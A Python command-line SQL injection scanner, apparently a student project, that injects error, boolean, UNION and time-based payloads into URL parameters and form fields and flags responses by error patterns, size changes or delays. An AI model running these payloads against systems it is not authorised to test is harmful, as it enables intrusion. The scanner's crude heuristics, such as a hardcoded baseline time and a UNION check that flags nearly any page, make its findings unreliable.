#!/usr/bin/env python3
"""
SQL Injection Vulnerability Scanner
Project #6: SQL Injection Detection Tool
"""

import requests
import sys
import time
import re
import json
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
import argparse
import socket

# Color codes for terminal output
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class SQLiScanner:
    def __init__(self, target, payloads=None, timeout=5, delay=0.5,
                 output_file="sqli_results.txt", verbose=False, threads=10):
        """
        Initialize the SQL Injection Scanner
        """
        self.target = target
        self.timeout = timeout
        self.delay = delay
        self.output_file = output_file
        self.verbose = verbose
        self.threads = threads
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        # Default SQL injection payloads
        self.payloads = payloads or [
            # Error-based
            {"payload": "'", "type": "error", "description": "Single quote"},
            {"payload": "\"", "type": "error", "description": "Double quote"},
            {"payload": "';", "type": "error", "description": "Single quote with semicolon"},
            
            # Boolean-based
            {"payload": "' OR '1'='1", "type": "boolean", "description": "OR true"},
            {"payload": "' OR 1=1--", "type": "boolean", "description": "OR 1=1"},
            {"payload": "' AND '1'='2", "type": "boolean", "description": "AND false"},
            
            # Union-based
            {"payload": "' UNION SELECT NULL--", "type": "union", "description": "Union NULL"},
            {"payload": "' UNION SELECT NULL,NULL--", "type": "union", "description": "Union NULL,NULL"},
            
            # Time-based (MySQL)
            {"payload": "' AND SLEEP(5)--", "type": "time", "description": "MySQL SLEEP(5)", "delay": 5},
            {"payload": "' OR SLEEP(5)--", "type": "time", "description": "MySQL OR SLEEP(5)", "delay": 5},
            
            # Time-based (MSSQL)
            {"payload": "' WAITFOR DELAY '0:0:5'--", "type": "time", "description": "MSSQL WAITFOR DELAY 5s", "delay": 5},
            
            # Time-based (PostgreSQL)
            {"payload": "' AND pg_sleep(5)--", "type": "time", "description": "PostgreSQL pg_sleep(5)", "delay": 5},
        ]
        
        # SQL error patterns for detection
        self.sql_error_patterns = [
            r'SQL syntax.*MySQL',
            r'Warning.*MySQL',
            r'MySQLSyntaxErrorException',
            r'valid MySQL result',
            r'PostgreSQL.*ERROR',
            r'Warning.*\Wpg_.*',
            r'ORA-[0-9]{5}',
            r'Oracle error',
            r'Microsoft OLE DB Provider for ODBC Drivers',
            r'Microsoft OLE DB Provider for SQL Server',
            r'ODBC SQL Server Driver',
            r'SQLServer JDBC Driver',
            r'Microsoft SQL Server',
            r'Incorrect syntax near',
            r'Unclosed quotation mark',
            r'Could not find stored procedure',
            r'Exception.*SQL',
            r'SQLSTATE',
            r'Driver.*SQL',
            r'SQLite error',
            r'PDOException',
            r'SQL Error',
            r'Error in query',
            r'You have an error in your SQL syntax',
            r'Column.*not found',
            r'Table.*not found',
            r'Unknown column',
            r'Unknown table',
            r'Invalid query',
            r'database.*error',
        ]
        
        self.results = []
        self.vulnerabilities = []
        self.baseline_response = None
        self.baseline_time = 0.3
    
    def test_connection(self):
        """Test if target is reachable"""
        print(f"{Colors.BOLD}[*] Testing connection to {self.target}...{Colors.RESET}")
        
        try:
            # Try with a timeout
            response = self.session.get(
                self.target,
                timeout=5,
                verify=False,
                allow_redirects=True
            )
            
            print(f"{Colors.GREEN}[✓] Target is reachable! Status: {response.status_code}{Colors.RESET}")
            return True
            
        except requests.exceptions.ConnectionError:
            print(f"{Colors.RED}[!] Connection Error: Cannot reach {self.target}{Colors.RESET}")
            return False
        except requests.exceptions.Timeout:
            print(f"{Colors.RED}[!] Timeout Error: Target took too long to respond{Colors.RESET}")
            return False
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {str(e)[:50]}{Colors.RESET}")
            return False
    
    def detect_sql_error(self, response_text):
        """Check if response contains SQL error messages"""
        for pattern in self.sql_error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False
    
    def get_parameters_from_url(self, url):
        """Extract GET parameters from URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return {k: v[0] if v else '' for k, v in params.items()}
    
    def parse_forms(self, html):
        """Parse HTML forms and extract parameters"""
        soup = BeautifulSoup(html, 'html.parser')
        forms = []
        
        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'get').lower(),
                'inputs': []
            }
            
            for input_tag in form.find_all('input'):
                input_data = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', '')
                }
                if input_data['name']:
                    form_data['inputs'].append(input_data)
            
            if form_data['inputs']:
                forms.append(form_data)
        
        return forms
    
    def build_url(self, base_url, params):
        """Build URL with parameters"""
        parsed = urlparse(base_url)
        encoded_params = urlencode(params)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, encoded_params, parsed.fragment))
    
    def get_baseline(self, url, method='GET'):
        """Get baseline response for comparison"""
        try:
            if method.upper() == 'POST':
                params = self.get_parameters_from_url(url)
                response = self.session.post(
                    url, 
                    data=params, 
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
            else:
                response = self.session.get(
                    url,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
            
            self.baseline_response = response.text
            self.baseline_time = 0.3  # Default baseline
            
            return response.text
            
        except Exception as e:
            if self.verbose:
                print(f"{Colors.YELLOW}[!] Baseline error: {e}{Colors.RESET}")
            return ""
    
    def test_parameter(self, url, param_name, param_value, method='GET'):
        """Test a single parameter with all payloads"""
        results = []
        
        for payload_data in self.payloads:
            payload = payload_data['payload']
            payload_type = payload_data.get('type', 'unknown')
            
            try:
                # Create modified parameters
                test_params = {param_name: param_value + payload}
                
                if self.delay > 0:
                    time.sleep(self.delay)
                
                start_time = time.time()
                
                if method.upper() == 'POST':
                    response = self.session.post(
                        url,
                        data=test_params,
                        timeout=self.timeout + 10,
                        verify=False,
                        allow_redirects=True
                    )
                else:
                    test_url = self.build_url(url, test_params)
                    response = self.session.get(
                        test_url,
                        timeout=self.timeout + 10,
                        verify=False,
                        allow_redirects=True
                    )
                
                response_time = time.time() - start_time
                
                # Analyze response
                vulnerability = {
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'payload_type': payload_type,
                    'description': payload_data.get('description', ''),
                    'method': method.upper()
                }
                
                # Check for SQL errors
                if self.detect_sql_error(response.text):
                    vulnerability['vulnerable'] = True
                    vulnerability['detection_method'] = 'error-based'
                    vulnerability['evidence'] = 'SQL error detected in response'
                    results.append(vulnerability)
                    continue
                
                # Check for boolean-based (content comparison)
                if payload_type in ['boolean', 'error'] and self.baseline_response:
                    baseline_len = len(self.baseline_response)
                    test_len = len(response.text)
                    
                    if abs(test_len - baseline_len) > baseline_len * 0.1:  # 10% change
                        vulnerability['vulnerable'] = True
                        vulnerability['detection_method'] = 'boolean-based'
                        vulnerability['evidence'] = f'Content size changed: {baseline_len} -> {test_len}'
                        results.append(vulnerability)
                        continue
                
                # Check for time-based
                if payload_type == 'time':
                    expected_delay = payload_data.get('delay', 5)
                    if response_time > (self.baseline_time + expected_delay * 0.8):
                        vulnerability['vulnerable'] = True
                        vulnerability['detection_method'] = 'time-based'
                        vulnerability['evidence'] = f'Response time: {response_time:.2f}s (normal: {self.baseline_time:.2f}s)'
                        vulnerability['response_time'] = response_time
                        results.append(vulnerability)
                        continue
                
                # Check for union-based
                if payload_type == 'union':
                    if len(response.text) > 100 and re.search(r'\b\d+\b', response.text):
                        vulnerability['vulnerable'] = True
                        vulnerability['detection_method'] = 'union-based'
                        vulnerability['evidence'] = 'Potential union-based injection detected'
                        results.append(vulnerability)
                        continue
                
            except requests.exceptions.Timeout:
                if payload_type == 'time':
                    vulnerability = {
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'payload_type': 'time-based',
                        'description': payload_data.get('description', ''),
                        'method': method.upper(),
                        'vulnerable': True,
                        'detection_method': 'time-based',
                        'evidence': 'Request timed out (likely time-based injection)'
                    }
                    results.append(vulnerability)
            except Exception as e:
                if self.verbose:
                    print(f"{Colors.YELLOW}[!] Error testing {param_name} with {payload}: {str(e)[:50]}{Colors.RESET}")
        
        return results
    
    def scan_parameters(self, url, params, method='GET'):
        """Scan all parameters"""
        all_results = []
        total_params = len(params)
        
        print(f"{Colors.BOLD}[*] Testing {total_params} parameters with {len(self.payloads)} payloads{Colors.RESET}")
        print(f"{Colors.BOLD}[*] Method: {method}{Colors.RESET}")
        print("")
        
        # Get baseline response
        if not self.baseline_response:
            self.get_baseline(url, method)
        
        for idx, (param_name, param_value) in enumerate(params.items(), 1):
            print(f"{Colors.BOLD}{Colors.BLUE}[{idx}/{total_params}] Testing parameter: {param_name}{Colors.RESET}")
            print(f"{Colors.CYAN}  Value: {param_value}{Colors.RESET}")
            
            if not param_name:
                print(f"{Colors.YELLOW}  Skipping empty parameter{Colors.RESET}\n")
                continue
            
            # Test the parameter
            param_results = self.test_parameter(url, param_name, param_value, method)
            
            if param_results:
                vulnerable_results = [r for r in param_results if r.get('vulnerable')]
                
                if vulnerable_results:
                    print(f"{Colors.RED}[!] VULNERABLE!{Colors.RESET}")
                    for result in vulnerable_results:
                        detection = result.get('detection_method', 'unknown')
                        evidence = result.get('evidence', 'No evidence')
                        payload = result.get('payload', '')
                        
                        print(f"  {Colors.RED}• Payload: {payload}{Colors.RESET}")
                        print(f"    Detection: {detection}")
                        print(f"    Evidence: {evidence}")
                        print("")
                    
                    all_results.extend(vulnerable_results)
                    self.vulnerabilities.extend(vulnerable_results)
                else:
                    print(f"{Colors.GREEN}[✓] Not vulnerable to tested payloads{Colors.RESET}\n")
            else:
                print(f"{Colors.GREEN}[✓] No vulnerabilities detected{Colors.RESET}\n")
        
        return all_results
    
    def scan(self):
        """Main scan method"""
        print("\n" + "=" * 70)
        print(f"{Colors.BOLD}{Colors.MAGENTA}[*] SQL Injection Scanner{Colors.RESET}")
        print("=" * 70)
        print(f"{Colors.BOLD}[*] Target: {self.target}{Colors.RESET}")
        print(f"{Colors.BOLD}[*] Payloads: {len(self.payloads)}{Colors.RESET}")
        print(f"{Colors.BOLD}[*] Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
        print("")
        
        # Test connection
        if not self.test_connection():
            print(f"{Colors.RED}[!] Cannot proceed with scan - target unreachable{Colors.RESET}")
            print(f"{Colors.YELLOW}[!] Try these alternatives:{Colors.RESET}")
            print(f"{Colors.CYAN}  1. http://scanme.nmap.org{Colors.RESET}")
            print(f"{Colors.CYAN}  2. http://example.com{Colors.RESET}")
            print(f"{Colors.CYAN}  3. Local DVWA/WebGoat instance{Colors.RESET}")
            return
        
        start_time = time.time()
        
        # Parse target URL
        parsed_url = urlparse(self.target)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # Check for GET parameters
        params = self.get_parameters_from_url(self.target)
        
        if params:
            print(f"{Colors.CYAN}[*] Found {len(params)} GET parameters{Colors.RESET}")
            self.scan_parameters(self.target, params, 'GET')
        else:
            print(f"{Colors.YELLOW}[!] No GET parameters found. Looking for forms...{Colors.RESET}")
            
            try:
                response = self.session.get(base_url, timeout=self.timeout, verify=False)
                forms = self.parse_forms(response.text)
                
                if forms:
                    print(f"{Colors.CYAN}[*] Found {len(forms)} form(s){Colors.RESET}")
                    for form_idx, form in enumerate(forms, 1):
                        form_action = form.get('action', '')
                        form_method = form.get('method', 'get')
                        
                        # Build form URL
                        if form_action.startswith('http'):
                            form_url = form_action
                        else:
                            form_url = base_url + form_action
                        
                        print(f"{Colors.CYAN}[*] Form #{form_idx}: {form_url} ({form_method}){Colors.RESET}")
                        
                        # Extract form parameters
                        form_params = {}
                        for input_data in form.get('inputs', []):
                            if input_data.get('name'):
                                form_params[input_data['name']] = input_data.get('value', '')
                        
                        if form_params:
                            self.scan_parameters(form_url, form_params, form_method.upper())
                else:
                    print(f"{Colors.YELLOW}[!] No forms found. Try scanning with GET parameters.{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[!] Error parsing forms: {str(e)[:50]}{Colors.RESET}")
        
        self.scan_time = time.time() - start_time
        self.generate_report()
    
    def generate_report(self):
        """Generate a detailed report"""
        print("\n" + "=" * 70)
        print(f"{Colors.BOLD}{Colors.GREEN}[✓] SCAN COMPLETE{Colors.RESET}")
        print("=" * 70)
        print(f"{Colors.BOLD}[*] Duration: {self.scan_time:.2f} seconds{Colors.RESET}")
        print(f"{Colors.BOLD}[*] Total Vulnerabilities: {len(self.vulnerabilities)}{Colors.RESET}")
        
        if self.vulnerabilities:
            print(f"\n{Colors.BOLD}{Colors.RED}[⚠️] VULNERABILITIES FOUND:{Colors.RESET}")
            print("-" * 50)
            
            # Group by URL
            vuln_by_url = {}
            for vuln in self.vulnerabilities:
                url = vuln.get('url', 'unknown')
                if url not in vuln_by_url:
                    vuln_by_url[url] = []
                vuln_by_url[url].append(vuln)
            
            for url, vulns in vuln_by_url.items():
                print(f"\n{Colors.BOLD}{Colors.CYAN}Target: {url}{Colors.RESET}")
                for vuln in vulns:
                    param = vuln.get('parameter', 'unknown')
                    method = vuln.get('method', 'GET')
                    payload = vuln.get('payload', '')
                    detection = vuln.get('detection_method', 'unknown')
                    evidence = vuln.get('evidence', '')
                    
                    print(f"  {Colors.RED}[+] Parameter: {param} ({method}){Colors.RESET}")
                    print(f"    Payload: {payload}")
                    print(f"    Detection: {detection}")
                    print(f"    Evidence: {evidence}")
                    print("")
        else:
            print(f"\n{Colors.GREEN}[✓] No vulnerabilities found!{Colors.RESET}")
            print(f"\n{Colors.YELLOW}[!] Note: The target may not be vulnerable or may require different payloads.{Colors.RESET}")
        
        # Save report
        self.save_report()
        
        # Show summary
        if self.vulnerabilities:
            print(f"\n{Colors.BOLD}{Colors.RED}[📋] VULNERABILITY SUMMARY:{Colors.RESET}")
            detection_types = {}
            for vuln in self.vulnerabilities:
                detection = vuln.get('detection_method', 'unknown')
                detection_types[detection] = detection_types.get(detection, 0) + 1
            
            for detection, count in detection_types.items():
                print(f"  {Colors.YELLOW}{detection}: {count}{Colors.RESET}")
        
        print("\n" + "=" * 70)
        print(f"{Colors.GREEN}[✓] Results saved to: {self.output_file}{Colors.RESET}")
        print("=" * 70)
    
    def save_report(self):
        """Save report to file"""
        with open(self.output_file, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write("SQL INJECTION SCAN REPORT\n")
            f.write("=" * 80 + "\n")
            f.write(f"Target:         {self.target}\n")
            f.write(f"Scan Started:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            if hasattr(self, 'scan_time'):
                f.write(f"Scan Duration:  {self.scan_time:.2f} seconds\n")
            f.write(f"Total Vulnerabilities: {len(self.vulnerabilities)}\n")
            f.write("=" * 80 + "\n\n")
            
            if self.vulnerabilities:
                f.write("VULNERABILITIES FOUND\n")
                f.write("-" * 50 + "\n")
                
                for idx, vuln in enumerate(self.vulnerabilities, 1):
                    f.write(f"\nVulnerability #{idx}\n")
                    f.write(f"  URL: {vuln.get('url', 'N/A')}\n")
                    f.write(f"  Parameter: {vuln.get('parameter', 'N/A')}\n")
                    f.write(f"  Method: {vuln.get('method', 'GET')}\n")
                    f.write(f"  Payload: {vuln.get('payload', 'N/A')}\n")
                    f.write(f"  Detection Method: {vuln.get('detection_method', 'N/A')}\n")
                    f.write(f"  Evidence: {vuln.get('evidence', 'N/A')}\n")
                    f.write(f"  Description: {vuln.get('description', 'N/A')}\n")
            else:
                f.write("No vulnerabilities found.\n")
            
            f.write("\n" + "=" * 80 + "\n")
            f.write("Report generated by SQL Injection Scanner\n")
            f.write("Project #6: SQL Injection Detection Tool\n")
            f.write("=" * 80 + "\n")
    
    def run(self):
        """Main execution method"""
        try:
            self.scan()
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}[!] Scan interrupted by user{Colors.RESET}")
            self.generate_report()
            sys.exit(0)
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
            import traceback
            traceback.print_exc()
            sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description="SQL Injection Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan a URL with GET parameters
  python sqli_scanner.py "http://testphp.vulnweb.com/artists.php?artist=1"
  
  # Scan with custom payloads
  python sqli_scanner.py "http://testphp.vulnweb.com/artists.php?artist=1" -p payloads.txt
  
  # Scan with verbose output
  python sqli_scanner.py "http://testphp.vulnweb.com/artists.php?artist=1" -v
  
  # Scan a form
  python sqli_scanner.py "http://testphp.vulnweb.com/login.php"
        """
    )
    
    parser.add_argument('target', help='Target URL (e.g., http://example.com/page.php?param=1)')
    parser.add_argument('-p', '--payloads', help='File containing custom payloads')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Request timeout in seconds (default: 5)')
    parser.add_argument('--delay', type=float, default=0.5, help='Delay between requests in seconds (default: 0.5)')
    parser.add_argument('-o', '--output', default='sqli_results.txt', help='Output file name')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads (default: 10)')
    
    args = parser.parse_args()
    
    # Display banner
    print(f"{Colors.CYAN}{Colors.BOLD}" + "=" * 70)
    print("    SQL INJECTION VULNERABILITY SCANNER")
    print("    Project #6: SQL Injection Detection Tool")
    print("=" * 70 + f"{Colors.RESET}\n")
    
    # Load custom payloads if provided
    payloads = None
    if args.payloads:
        try:
            with open(args.payloads, 'r') as f:
                payloads = [{'payload': line.strip(), 'type': 'custom', 'description': 'Custom payload'} 
                           for line in f if line.strip()]
            print(f"{Colors.GREEN}[✓] Loaded {len(payloads)} custom payloads{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error loading payloads: {e}{Colors.RESET}")
    
    # Create and run scanner
    scanner = SQLiScanner(
        target=args.target,
        payloads=payloads,
        timeout=args.timeout,
        delay=args.delay,
        output_file=args.output,
        verbose=args.verbose,
        threads=args.threads
    )
    
    scanner.run()

if __name__ == "__main__":
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()